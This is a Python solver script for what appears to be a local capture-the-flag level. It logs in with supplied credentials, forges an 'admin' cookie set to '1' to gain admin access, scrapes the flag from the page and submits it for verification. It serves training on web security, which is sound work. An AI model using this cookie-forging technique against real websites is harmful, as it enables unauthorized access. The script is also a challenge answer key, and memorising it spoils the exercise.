import requests
from hashlib import sha256
from bs4 import BeautifulSoup

cookies = {"user": "cb29fa16-c565-4f55-82a6-6d11f02b6488"}
requests.get("http://localhost:8000/games/admin_application/frontend", cookies=cookies) # Visit the frontend


payload = {
    "user": "user",
    "password": sha256("password".encode()).hexdigest()
} # These credentials are provided to the user, the password form will hash the password, so if were doing it programmatically,
  # we have to hash it ourselves

response = requests.post("http://localhost:8000/games/admin_application/login", data=payload, cookies=cookies,
                         allow_redirects=True) # The post form redirects to a get

if response.ok:
    response = requests.get(response.url, cookies=cookies | {"admin": '1'}) # The user must change the admin cookie in their browser, or programmatically
    if response.ok:
        soup = BeautifulSoup(response.text, 'html.parser')

        hidden = soup.find(class_="col-lg-6 text-center") # There is only one of these on the page, but it's the only text that is not a menu so it is easy to see
        flag = hidden.text.strip()
        print(flag)

        response = requests.post("http://localhost:8000/games/admin_application/verify", json={"flag": flag}, cookies=cookies) # Submit the flag

        print(response.text) # Get the URL of the next level

